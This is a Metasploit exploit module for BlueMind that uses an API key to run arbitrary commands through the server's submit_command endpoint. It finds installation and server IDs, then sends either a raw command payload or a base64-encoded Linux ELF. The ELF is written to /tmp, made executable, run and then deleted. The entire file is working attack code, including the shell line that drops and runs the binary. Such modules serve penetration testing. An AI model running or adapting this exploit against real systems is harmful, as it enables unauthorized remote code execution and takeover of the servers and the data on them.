##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'
require 'msf/core'
require 'securerandom'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "BlueMind submit_command API Command Execution",
      'Description'    => %q{
        Command Execution on BlueMind through the submit_command API.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'Damien Picard <damien.picard@synacktiv.com',
        'Julien Szlamowicz <julien.szlamowicz@synacktiv.com>'
      ],
      'Targets' => [
        [
          'Unix CMD', {
            'Platform' => %w{ unix },
            'Arch' => [ ARCH_CMD ]
          }
        ],
        [
          'Linux x86', {
            'Platform' => %w{ linux },
            'Arch' => [ ARCH_X86 ]
          }
        ],
        [
          'Linux x64', {
            'Platform' => %w{ linux },
            'Arch' => [ ARCH_X64 ]
          }
        ],
      ]
      ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base BlueMind URI', '/']),
        OptString.new('APIKEY', [true, 'The BlueMind core api token']),
        OptString.new('INSTALLATION_ID', [false, 'The BlueMind installation id on which to run command']),
        OptString.new('SERVER_ID', [false, 'The BlueMind server id on which to run command'])
      ], self.class)
  end

  def get_installation_id
    if datastore['INSTALLATION_ID'].nil?
      installation_id = uniq_and_notify(list_installations(), "server")
    else
      installation_id = datastore['INSTALLATION_ID']
    end
    return installation_id
  end

  def get_server_id(installation_id)
    if datastore['SERVER_ID'].nil?
      server_id = uniq_and_notify(list_servers(installation_id), "server")
    else
      server_id = datastore['SERVER_ID']
    end
    return server_id
  end

  def uniq_and_notify(collection, name)
    item = collection[0]['uid']
    if collection.count > 1
      vprint_status("Found #{collection.count} #{name} ids")
      collection.each { |c| vprint_status(" * #{c['uid']}") }
      vprint_status("Using: #{item}")
    end
    return item
  end

  def list_installations
    resp = send_request_raw({
      'method' => 'POST',
      'uri' => normalize_uri(datastore['TARGETURI'], 'api', 'containers', '_manage', '_list'),
      'headers' => {'X-BM-ApiKey' => datastore['APIKEY']},
      'data' => '{"type": "installation", "verb": ["All"]}'
    })
    return JSON.parse(resp.body)
  end

  def list_servers(installation_id)
    resp = send_request_raw({
      'method' => 'GET',
      'uri' => normalize_uri(datastore['TARGETURI'], 'api', 'servers', installation_id, '_complete'),
      'headers' => {'X-BM-ApiKey' => datastore['APIKEY']},
    })
    return JSON.parse(resp.body)
  end

  def submit_command(cmd, installation_id, server_id)
    uri = normalize_uri(datastore['TARGETURI'], 'api', 'servers', installation_id, server_id, 'submit_command')
    resp = send_request_raw({
      'method' => 'POST',
      'uri' => uri,
      'headers' => {'X-BM-ApiKey' => datastore['APIKEY']},
      'data' => JSON.generate(cmd)
    })
    return JSON.parse(resp.body)
  end

  def submit_command_and_wait(cmd, installation_id, server_id)
    uri = normalize_uri(datastore['TARGETURI'], 'api', 'servers', installation_id, server_id, 'submit_command_and_wait')
    resp = send_request_raw({
      'method' => 'POST',
      'uri' => uri,
      'headers' => {'X-BM-ApiKey' => datastore['APIKEY']},
      'data' => JSON.generate(cmd)
    })
    return JSON.parse(resp.body)
  end

  def stage_linux(payload, installation_id, server_id)
    payload_path = "/tmp/tmpUpload/" + SecureRandom.uuid
    b64payload = Rex::Text.encode_base64(payload)
    cmd = "sh -c 'echo #{b64payload} | base64 -d > #{payload_path} && chmod +x #{payload_path} && #{payload_path}'"
    submit_command(cmd, installation_id, server_id)
    submit_command("rm #{payload_path}", installation_id, server_id)
  end

  def exploit
    installation_id = get_installation_id()
    server_id = get_server_id(installation_id)
    print_status("Got instalaltion id #{installation_id}")
    print_status("Got server id #{server_id}")
    case payload.arch.first
    when ARCH_CMD
      cmd = payload.encoded
      submit_command(cmd, installation_id, server_id)
    when ARCH_X64
      exe = Msf::Util::EXE.to_linux_x64_elf(framework, payload.raw)
      stage_linux(exe, installation_id, server_id)
    when ARCH_X86
      exe = Msf::Util::EXE.to_linux_x86_elf(framework, payload.raw)
      stage_linux(exe, installation_id, server_id)
    end
  end
end
